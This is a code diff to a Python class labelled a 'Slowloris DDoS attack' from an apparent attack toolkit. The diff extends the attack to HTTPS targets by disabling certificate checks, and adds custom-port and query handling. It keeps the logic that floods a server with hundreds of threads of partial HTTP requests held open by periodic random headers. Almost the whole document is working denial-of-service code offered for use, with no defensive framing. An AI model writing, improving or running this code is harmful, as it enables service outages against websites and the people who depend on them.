@@ -4,32 +4,44 @@
 """
 Slowloris Attack Implementation
 Architect 01 - Professional Suite
+SUPPORT ALL PROTOCOLS
 """
 
 import socket
 import time
 import random
 import threading
+import ssl
 from urllib.parse import urlparse
 from colorama import Fore, Style
 from core.utils.useragents import get_random_ua
 
 class SlowlorisAttack:
-    """Slowloris DDoS attack - holds connections open"""
+    """Slowloris DDoS attack - Support semua protocol"""
     
     def __init__(self, target_url, threads=300):
         self.target_url = target_url
         self.threads = threads
         self.parsed = urlparse(target_url)
-        self.host = self.parsed.netloc
-        self.port = 443 if self.parsed.scheme == 'https' else 80
+        self.host = self.parsed.netloc.split(':')[0]
+        
+        # Default port berdasarkan scheme
+        if ':' in self.parsed.netloc:
+            self.port = int(self.parsed.netloc.split(':')[1])
+        else:
+            self.port = 443 if self.parsed.scheme == 'https' else 80
+            
         self.path = self.parsed.path or '/'
+        if self.parsed.query:
+            self.path += '?' + self.parsed.query
+            
         self.sockets = []
         self.running = True
         self.total_connections = 0
+        self.use_ssl = self.parsed.scheme in ['https', 'wss', 'ftps']
         
     def create_connection(self):
-        """Create a new socket connection"""
+        """Create a new socket connection - Support SSL/TLS"""
         try:
             # Create socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,6 +49,13 @@ class SlowlorisAttack:
             
             # Connect
             sock.connect((self.host, self.port))
+            
+            # Wrap with SSL if needed
+            if self.use_ssl:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                sock = context.wrap_socket(sock, server_hostname=self.host)
             
             # Send initial partial request
             ua = get_random_ua()
@@ -68,24 +87,20 @@ class SlowlorisAttack:
             if not self.running:
                 break
         
-        # Maintain connections by sending headers periodically
+        # Maintain connections
         while self.running:
             for sock in local_sockets[:]:
                 try:
-                    # Send random header to keep connection alive
                     header = f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n"
                     sock.send(header.encode())
                     time.sleep(random.uniform(5, 15))
-                    
-                except Exception:
-                    # Connection died, remove and create new one
+                except:
                     local_sockets.remove(sock)
                     new_sock = self.create_connection()
                     if new_sock:
                         local_sockets.append(new_sock)
                         self.total_connections += 1
             
-            # Add new connections if we lost some
             while len(local_sockets) < 50 and self.running:
                 new_sock = self.create_connection()
                 if new_sock:
@@ -94,42 +109,31 @@ class SlowlorisAttack:
                 time.sleep(0.5)
     
     def start(self):
-        """Start the Slowloris attack"""
-        print(f"{Fore.YELLOW}\n   ╰─❯ Starting Slowloris attack on {self.target_url}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}   ╰─❯ Threads: {self.threads}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}   ╰─❯ Press Ctrl+C to stop\n{Style.RESET_ALL}")
+        print(Fore.YELLOW + "\n╰─❯ Starting Slowloris attack on " + self.target_url)
+        print(Fore.YELLOW + "╰─❯ Host: " + self.host + ":" + str(self.port))
+        print(Fore.YELLOW + "╰─❯ SSL/TLS: " + ('Yes' if self.use_ssl else 'No'))
+        print(Fore.YELLOW + "╰─❯ Threads: " + str(self.threads))
+        print(Fore.YELLOW + "╰─❯ Press Ctrl+C to stop\n" + Style.RESET_ALL)
         
-        # Start worker threads
         workers = []
         for i in range(self.threads):
             worker = threading.Thread(target=self.attack_worker)
             worker.daemon = True
             worker.start()
             workers.append(worker)
-            time.sleep(0.05)  # Stagger start
+            time.sleep(0.05)
         
-        # Monitor connections
         try:
             last_count = 0
             while self.running:
                 time.sleep(10)
                 new_conns = self.total_connections - last_count
                 last_count = self.total_connections
-                print(f"{Fore.GREEN}   ╰─❯ Total connections: {self.total_connections} | New: {new_conns}/10s{Style.RESET_ALL}")
-                
+                print(Fore.GREEN + "╰─❯ Total connections: " + str(self.total_connections) + " | New: " + str(new_conns) + "/10s" + Style.RESET_ALL)
         except KeyboardInterrupt:
             self.stop()
     
     def stop(self):
-        """Stop the attack"""
         self.running = False
-        print(f"{Fore.RED}\n   ╰─❯ Stopping Slowloris attack...{Style.RESET_ALL}")
-        
-        # Close all sockets
-        for sock in self.sockets:
-            try:
-                sock.close()
-            except:
-                pass
-        
-        print(f"{Fore.RED}   ╰─❯ Attack stopped. Total connections made: {self.total_connections}{Style.RESET_ALL}")
+        print(Fore.RED + "\n╰─❯ Stopping Slowloris attack...")
+        print(Fore.RED + "╰─❯ Total connections made: " + str(self.total_connections) + Style.RESET_ALL)
